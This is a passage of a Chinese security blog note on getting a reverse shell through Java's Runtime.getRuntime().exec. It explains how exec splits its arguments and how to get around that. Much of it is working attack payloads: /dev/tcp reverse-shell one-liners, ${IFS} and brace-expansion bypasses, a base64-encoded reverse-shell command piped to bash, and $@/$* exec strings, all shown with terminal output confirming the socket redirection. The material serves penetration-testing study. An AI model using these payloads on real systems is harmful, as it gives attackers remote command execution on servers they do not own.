class="headerlink" title="Runtime.getRuntime().exec"></a>Runtime.getRuntime().exec</h3><h4 id="exec-new-String"><a href="#exec-new-String" class="headerlink" title="exec(new String[])"></a>exec(new String[])</h4><p>在此模式解析的关键是<code>java.lang.UNIXProcess#UNIXProcess</code>，在<code>-c</code>模式下，可以看到参数为两个</p><p>P.S. 个人认为是因为如<code>&gt;&amp;</code>等参数无法被识别为bash参数，它应属于当前 bash 环境下的操作</p><ol><li><p>直接数组化无法解析，解析参数为 4 个</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15816475716996.jpg" alt="-w1640"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15840206558058.jpg" alt="-w1005"></p></li><li><p>数组化 with <code>-c</code>能正确解析，解析参数为 2 个</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15816478550627.jpg" alt="-w1680"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15816487793325.jpg" alt="-w996"></p></li></ol><h4 id="exec-new-String-1"><a href="#exec-new-String-1" class="headerlink" title="exec(new String)"></a>exec(new String)</h4><p>如果我们只传入一个字符串时，会经过 StringTokenizer 分割，注意会识别<strong>五个</strong>字符</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15816481561408.jpg" alt="-w537"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15816521932598.jpg" alt="-w631"></p><p>所以我们需要找到一个字符能够绕过分割且能被<code>/bin/bash</code>正确识别为空格</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h3><blockquote><p>一般情况下，<code>$var</code>与<code>${var}</code>并没有啥不一样。但是用<code>${ }</code>会比较精确的界定变量名称的范围</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15816540712094.jpg" alt="-w489"></p><p>如果直接利用会报错<code>ambiguous redirect(歧义重定向)</code></p><pre class=" language-shell"><code class="language-shell"># 报错 ambiguous redirectbash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345${IFS}0>&1bash: ${IFS}/dev/tcp/127.0.0.1/12345${IFS}0: ambiguous redirect# 正常bash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345 0>&1</code></pre><p>那么最后一个空格该如何处理呢，我们可以看到，经过<code>&gt;&amp; socks</code>后，stdou stderr 已经被重定向到了 socks 文件，最后一句<code>0&gt;&amp;1</code>就是试图将 stdin 也重定向过去</p><pre class=" language-bash"><code class="language-bash">test@test:~$ <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345test@test:~$ <span class="token function">ls</span> -l /proc/14067/fd总用量 0lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 0 -<span class="token operator">></span> /dev/pts/1lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 1 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 10 -<span class="token operator">></span> /dev/ttylrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 2 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span></code></pre><p>注意到<code>文件描述符的复制</code>中<code>[n]&lt;&amp;word</code>格式，我们可以将 socks 文件描述符复制到 stdin 中</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># 添加 IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span>0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><p>同时由于 n 默认为 stdin，那么我们也可以利用此规则不出现 0</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># 添加 IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><p>甚至省略最后的空格，以及非必要的空格</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># 添加 IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># 省略非必要空格+IFS 测试</span>test@test:~$ <span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1test@test:~$ <span class="token function">ls</span> -l /proc/14556/fd总用量 0lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 0 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 1 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 2 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 255 -<span class="token operator">></span> /dev/tty</code></pre><h3 id="bash-Brace-Expansion"><a href="#bash-Brace-Expansion" class="headerlink" title="bash Brace Expansion"></a>bash Brace Expansion</h3><p>花括号扩展，详细见参考资料 3</p><pre class=" language-shell"><code class="language-shell">test@test:~$ echo hello{'world','linux'},helloworld, hellolinux,test@test:~$ echo hello{1..5},hello1, hello2, hello3, hello4, hello5,</code></pre><pre class=" language-shell"><code class="language-shell">test@test:~$ bash -c "{echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}"Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}");</code></pre><h3 id><a href="#" class="headerlink" title="$@ $*"></a><code>$@</code> <code>$*</code></h3><p>细节及区别详见：<a href="http://c.biancheng.net/cpp/view/2739.html" target="_blank" rel="noopener">Shell特殊变量</a></p><table><thead><tr><th>参数处理</th><th>说明</th></tr></thead><tbody><tr><td><code>$*</code></td><td>以一个单字符串显示所有向脚本传递的参数。<br>如<code>$*</code>用<code>&quot;</code>括起来的情况、以<code>$1 $2 … $n</code>的形式输出所有参数。</td></tr><tr><td><code>$@</code></td><td>与<code>$*</code>相同，但是使用时加引号，并在引号中返回每个参数。<br>如<code>$@</code>用<code>&quot;</code>括起来的情况、以<code>&quot;$1&quot; &quot;$2&quot; … &quot;$n&quot;</code>的形式输出所有参数。</td></tr></tbody></table><p>以下内容来自</p><p>那么我们就可以利用来反弹shell了。看bash语法：</p><pre class=" language-shell"><code class="language-shell">bash [options] [command_string | file]-c   If the -c option is present, then commands are read from the first non-option argument command_string.If there are arguments after the command_string, they are assigned to the positional parameters, starting with $0.</code></pre><p>结合bash和$@，我们可以变为：</p><pre class=" language-shell"><code class="language-shell">/bin/sh -c '$@|sh' xxx  echo ls</code></pre><p>可以成功地执行<code>ls</code>。分析下这个命令，当<code>bash</code>解析到<code>&#39;$@|sh&#39; xxx echo ls</code>，发现<code>$@</code>。<code>$@</code>需要取脚本的参数，那么就会解析<code>xxx echo ls</code>，由于<code>$@</code>只会取脚本参数，会将第一个参数认为是脚本名称<strong>(认为<code>xxx</code>是脚本名称)</strong>，就会取到<code>echo ls</code>。那么最终执行的就是<code>echo ls|sh</code>，就可以成功地执行<code>ls</code>命令了。</p><p>利用上面这个<code>trick</code>，那么我们就可以执行任意命令了，包括反弹shell。如<code>/bin/bash -c &#39;$@|bash&#39; 0 echo &#39;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&#39;</code>最终可以成功地反弹shell</p><pre class=" language-shell"><code class="language-shell">Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");Runtime.getRuntime().exec("/bin/bash -c $*|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");</code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15831418726956.jpg" alt="-w974"></p><p>最终相当于执行了<code>echo &#39;bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1&#39;|bash</code>命令，成功反弹shell</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://xz.aliyun.com/t/2548#toc-0" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a></li><li><a href="https://xz.aliyun.com/t/2549#toc-8" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></li><li><a href="https://www.cnblogs.com/leixiao-/p/10216571.html" target="_blank" rel="noopener">linux下形如{command,parameter,parameter}执行命令 / bash花括号扩展</a></li><li><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">绕过exec获取反弹shell</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
